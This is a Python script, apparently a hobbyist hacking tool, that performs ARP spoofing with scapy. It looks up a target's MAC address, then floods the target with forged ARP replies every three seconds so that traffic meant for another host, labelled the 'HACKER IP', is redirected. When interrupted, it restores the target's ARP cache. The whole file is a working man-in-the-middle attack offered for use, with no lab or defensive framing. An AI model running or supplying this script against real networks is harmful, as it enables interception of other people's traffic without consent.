#!/usr/bin/env python

import scapy.all as scapy
from optparse import OptionParser
from colorama import Fore
from time import sleep

def get_mac(target_ip):
    arp_requests = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_requests = broadcast/arp_requests
    answerd  = scapy.srp(broadcast_arp_requests, timeout=1, verbose=False)[0]
    try:
        client_mac = answerd[0][1].hwsrc
    except:
        print(Fore.RED + '[-] could not to be get MAC address.')
        quit()
    return client_mac

def get_args():
    parser = OptionParser()
    parser.add_option('-t','--target', dest='target_ip', help='target IP.')
    parser.add_option('-m','--mac', dest='target_mac', help='target MAC address.')
    parser.add_option('-s','--source', dest='spoofer_ip', help='spoofer IP address, HACKER IP !!')
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error(Fore.RED + '[-] please specify an target IP address, --help for more info.')
    elif not options.spoofer_ip:
        parser.error(Fore.RED + '[-] please specify an spoofer IP address, --help for more info.')
    return options

def arp_spoofing(target_ip,target_mac,spoofer_ip):
    packet = scapy.ARP(op=2, psrc=spoofer_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
    scapy.send(packet, verbose=False, count=4)

options = get_args()
if not options.target_mac:
    target_mac = get_mac(options.target_ip)
else:
    target_mac = options.target_mac

count_packet = 0
try : 
    while True:
        arp_spoofing(options.target_ip, target_mac, options.spoofer_ip)
        count_packet += 1
        print(Fore.GREEN + "\rPacket send : " + str(count_packet), end='')
        sleep(3)
except KeyboardInterrupt:
    print(Fore.RED + "\n[+] Detected CTRL + C ......... Restoring ...... please wait.")
    source_mac = get_mac(options.spoofer_ip)
    restore(options.target_ip, target_mac, options.spoofer_ip, source_mac)
    

